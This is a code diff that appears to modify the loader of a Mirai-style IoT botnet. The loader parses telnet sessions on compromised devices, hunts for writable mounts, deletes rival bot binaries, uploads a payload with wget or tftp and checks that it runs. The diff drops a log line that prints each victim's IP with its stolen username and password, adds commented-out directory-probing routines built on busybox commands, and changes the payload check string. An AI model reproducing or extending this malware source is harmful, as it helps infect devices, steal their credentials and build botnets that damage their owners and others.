@@ -60,18 +60,13 @@ void connection_close(struct connection *conn)
 
         if(conn->srv == NULL)
         {
+            //printf("srv == NULL\n");
             return;
         }
 
         if(conn->success)
         {
             ATOMIC_INC(&conn->srv->total_successes);
-            fprintf(stderr, "\e[92m[INFECTING] \e[97m%d.%d.%d.%d ~~> %s:%s (%s)\n\033[0m\r",
-                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff, conn->info.user, conn->info.pass, conn->info.arch);
-        }
-        else
-        {
-            ATOMIC_INC(&conn->srv->total_failures);
         }
     }
 
@@ -246,6 +241,112 @@ int connection_consume_verify_login(struct connection *conn)
         return prompt_ending;
 }
 
+/*int connection_consume_mounts(struct connection *conn)
+{
+    char linebuf[256];
+    int linebuf_pos = 0, num_whitespaces = 0;
+    int i = 0, prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
+
+    if(prompt_ending == -1)
+        return 0;
+
+    for(i = 0; i < prompt_ending; i++)
+    {
+
+        if(linebuf_pos == sizeof(linebuf) - 1)
+        {
+            // why are we here
+            break;
+        }
+
+        if(conn->rdbuf[i] == '\n')
+        {
+            char *path, *mnt_info;
+
+            linebuf[linebuf_pos++] = 0;
+
+            strtok(linebuf, " "); // Skip name of partition
+            if((path = strtok(NULL, " ")) == NULL)
+                goto dirs_end_line;
+            if(strtok(NULL, " ") == NULL) // Skip type of partition
+                goto dirs_end_line;
+            if((mnt_info = strtok(NULL, " ")) == NULL)
+                goto dirs_end_line;
+
+            if(path[strlen(path) - 1] == '/')
+                path[strlen(path) - 1] = 0;
+
+            if(util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1)
+            {
+                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.bhaagp; /bin/busybox cat %s/.bhaagp; rm -rf %s/.bhaagp\r\n",
+                                VERIFY_STRING_HEX, path, path, path, path, path);
+            }
+
+            dirs_end_line:
+            linebuf_pos = 0;
+        }
+        else if(conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')
+        {
+            if(num_whitespaces++ == 0)
+                linebuf[linebuf_pos++] = conn->rdbuf[i];
+        }
+        else if(conn->rdbuf[i] != '\r')
+        {
+            num_whitespaces = 0;
+            linebuf[linebuf_pos++] = conn->rdbuf[i];
+        }
+    }
+
+    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.bhaagp; /bin/busybox cat /dev/.bhaagp; rm -rf /dev/.bhaagp\r\n",
+                                VERIFY_STRING_HEX);
+
+    util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
+    return prompt_ending;
+}*/
+
+/*int connection_consume_written_dirs(struct connection *conn)
+{
+    int end_pos = 0, i = 0, offset = 0, total_offset = 0;
+    BOOL found_writeable = FALSE;
+
+    if((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1)
+        return 0;
+
+    while(TRUE)
+    {
+        char *pch;
+        int pch_len = 0;
+
+        offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
+        if(offset == -1)
+            break;
+        total_offset += offset;
+
+        pch = strtok(conn->rdbuf + total_offset, "\n");
+        if(pch == NULL)
+            continue;
+        pch_len = strlen(pch);
+
+        if(pch[pch_len - 1] == '\r')
+            pch[pch_len - 1] = 0;
+
+        util_sockprintf(conn->fd, "rm -rf %s/.t; rm -rf %s/upnp; rm -rf %s/dvrHelper; rm -rf %s/%s; rm -rf %s/.retrieve; rm -rf %s/binary; rm -rf %s/.dvrConfig\r\n",
+                        pch, pch, pch, pch, FN_DROPPER, pch, pch, pch);
+        if(!found_writeable)
+        {
+            if(pch_len < 31)
+            {
+                strcpy(conn->info.writedir, pch);
+                found_writeable = TRUE;
+            }
+            else
+                connection_close(conn);
+        }
+    }
+
+    return end_pos;
+}*/
+
 int connection_consume_copy_op(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
@@ -417,6 +518,10 @@ int connection_upload_wget(struct connection *conn)
         return offset * -1;
     else if(util_memsearch(conn->rdbuf, offset, "llegal option", 13) != -1)
         return offset * -1;
+    /*else if(util_memsearch(conn->rdbuf, offset, "-                      0% |                               |     0  --:--:-- ETA", 79) != -1)
+        return offset * -1;
+    else if(util_memsearch(conn->rdbuf, offset, "No such file or directory", 25) != -1)
+        return offset * -1;*/
     else if(util_memsearch(conn->rdbuf, offset, "No space left on device", 23) != -1)
     {
         conn->clear_up = 1;
@@ -441,6 +546,8 @@ int connection_upload_tftp(struct connection *conn)
         return offset * -1;
     else if(util_memsearch(conn->rdbuf, offset, "nvalid option", 13) != -1)
         return offset * -1;
+    /*else if(util_memsearch(conn->rdbuf, offset, "No such file or directory", 25) != -1)
+        return offset * -1;*/
     else if(util_memsearch(conn->rdbuf, offset, "No space left on device", 23) != -1)
     {
         conn->clear_up = 1;
@@ -457,7 +564,7 @@ int connection_verify_payload(struct connection *conn)
     if(offset == -1)
         return 0;
     
-    if(util_memsearch(conn->rdbuf, offset, "Oh well...", 10) == -1)
+    if(util_memsearch(conn->rdbuf, offset, "I AM SO UNSTABLE", 16) == -1)
         return offset;
     else
         return 255 + offset;
